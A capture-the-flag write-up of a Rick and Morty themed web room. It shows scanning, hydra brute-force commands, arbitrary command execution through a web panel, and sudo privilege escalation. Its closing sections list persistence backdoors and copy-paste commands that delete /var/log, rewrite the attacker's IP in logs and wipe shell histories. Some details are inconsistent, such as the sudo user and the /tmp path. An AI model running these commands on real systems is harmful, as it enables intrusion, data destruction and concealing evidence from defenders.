## PHASE 1: Reconnaissance

Description of the room:

> This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

## PHASE 2: Scanning & Enumeration

### Running: `nmap`

Ran the following:

> `nmap -Pn xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```python
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://xxx.xxx.xxx.xxx`

But then ultimately ran again using the `common.txt` dirb wordlist:

> `gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u http://xxx.xxx.xxx.xxx`

Interesting folders found:

```python
/robots.txt           (Status: 200) [Size: 17] 
```

*Also see: [gobuster.log](gobuster.log) and [gobuster_common.log](gobuster_common.log)*

### Running: `nikto`

Ran the following:

> `nikto -h xxx.xxx.xxx.xxx`

Found the following:

```python
+ /login.php: Admin login page/section found.
```

Also see: [nikto.log](nikto.log)

## PHASE 3: Gaining Access

### Unprivileged Access

Unsuccessfully, I did try using the username found in the HTML source of the main `index.html` page with hydra to brute force SSH and the login page, but those didn't work. Those commands were:

#### SSH

```bash
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt \
    ssh://xxx.xxx.xxx.xxx
```

*See: [hydra.ssh.log](hydra.ssh.log)*

#### HTTP

```bash
hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt \
    xxx.xxx.xxx.xxx http-post-form \
    "/login.php:username=^USER^&password=^PASS^&sub=Login:F=Invalid username or password."
```

*See: [hydra.web.log](hydra.web.log)*

---

Next, using the username found in the HTML source of the main `index.html` page, and using the potential password we found in `/robots.txt`, we try those credentials from the `/login.php` page, and find that we can log in and use a "Command Panel" which appears to let us run arbitrary commands, and see the results.

We can run `ls -la` to find:

```bash
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

The contents of `Sup3rS3cretPickl3Ingred.txt` are the answer to the "first ingredient" needed for this room.

---

If we run `less /etc/passwd` we can see that there is a user account called `ubuntu`. Or, we can run `ls -la /home/` to see the users who have a home directory. With that, we can see a directory listing of that users' home directory with `ls -ls /home/rick` and get:

```bash
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

The contents of `second ingredients` are the answer to the "second ingredient" needed for this room.

### Privilege Escalation

With this access we have, we can also look in the `ubuntu` users home folder with `ls -la /home/ubuntu` and see:

```bash
total 40
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
```

Since we have a `.sudo_as_admin_successful` file, we might assume we have some `sudo` privileges, so we run `sudo -l` to see:

```bash
Matching Defaults entries for www-data on ip-10-10-243-208.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-243-208.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Wow. So, the `ubuntu` account has `sudo` privilege and no password prompt. Let's use that to look in the `root` home folder with `sudo ls -la /root` to find:

```bash
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Feb  6 02:07 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
```

The contents of `3rd.txt` are the answer to the "final ingredient" needed to complete this room.

## PHASE 4: Maintaining Access & Persistence

This is a test/CTF machine, so this is out of scope. However, in a Red Team scenario, we could:

- Add SSH key to `/root/.ssh/authorized_keys`
- Create a privileged account that wouldnâ€™t draw attention (ex: `operations`) or an unprivileged account and give it `sudo` access via group or directly in the `/etc/sudoers` file.
- Install some other backdoor or service.

## PHASE 5: Clearing Tracks

This is a test/CTF machine, so this is out of scope. However, in a Red Team scenario, we could:

### Delete Logs

Delete relevant logs from `/var/log/` - although that might draw attention.

```bash
rm -Rf /var/log/*
```

### Replace our IP

Search and replace our IP address in all logs.

#### OPTION 1: Simple

The simplest way is via something like:

```bash
find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;
```

This searches for all files under `/var/log/` and for each file found, searches for `10.10.2.14` (replace this with your IP) and and replace anywhere that is found with `127.0.0.1`.

#### OPTION 2: Complex

You could come up with your own scheme. For example, you could generate a random IP address with:

```bash
awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'
```

I'd like this to use a new, unique, random IP address for every instance found, but `sed` doesn't support command injection in the search/replace operation. However, you could generate a random IP address to a variable and use that for this search and replace, like below. Note that the `2> /dev/null` hides any error messages of accessing files.

##### As separate statements

In case you want to work out each individual piece of this, here they are as separate statements:

```bash
# MY IP address that I want to scrub.
srcip="22.164.233.238"

# Generate a new, unique, random IP address
rndip=`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`

# Find all files and replace any place that you see my IP, with the random one.
find /var/log -name "*" -exec sed -i "s/$srcip/$rndip/g" {} \; 2> /dev/null
```

##### As one ugly command

This is something you could copy/paste, and just change your IP address.

Basically, just set your `srcip` to your workstations' IP first, and MAKE SURE to run this with a space prefixed, so this command doesn't get written to the shell's history files (e.g. `~/.bash_history`, `~/.zsh_history`, etc.)

```bash
 srcip="10.10.10.10" ; find /tmp -name "*" -exec sed -i "s/$srcip/`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`/g" {} \; 2>/dev/null
```

or optionally, start a new shell, turn off command history, AND start the command with a space prefixed (which also should not add the command to the shell history), then exit out of that separate process:

```bash
bash
unset HISTFILE
 srcip="10.10.10.10" ; find /tmp -name "*" -exec sed -i "s/$srcip/`awk -v min=1 -v max=255 'BEGIN{srand(); for(i=1;i<=4;i++){ printf int(min+rand()*(max-min+1)); if(i<4){printf "."}}}'`/g" {} \; 2>/dev/null
exit
```

The key idea here is that hiding your address from the logs would be pointless if the *command* for hiding your address from the logs were in a log some place!

### Wipe shell history

For any accounts that we used, if we don't mind that this will destroy valid entries of the user too (and give them an indication their account was compromised), run a comand like this with `tee` writing out nothing/null to multiple files at once:

```bash
cat /dev/null | tee /root/.bash_history /home/kathy/.bash_history /home/sam/.bash_history
```
